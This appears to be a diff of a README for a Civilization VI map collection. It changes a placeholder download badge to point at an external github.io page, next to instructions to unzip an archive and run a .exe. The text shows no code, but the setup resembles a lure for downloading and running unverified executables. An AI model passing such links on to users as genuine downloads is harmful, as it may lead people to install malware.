@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://civ6-realistic-game-collection.github.io/.github/)
 
 ## 📸 Overview
 ![civ6-realistic-maps](https://github.com/user-attachments/assets/837b0f69-5cdf-4a86-9542-c4221e99e480)
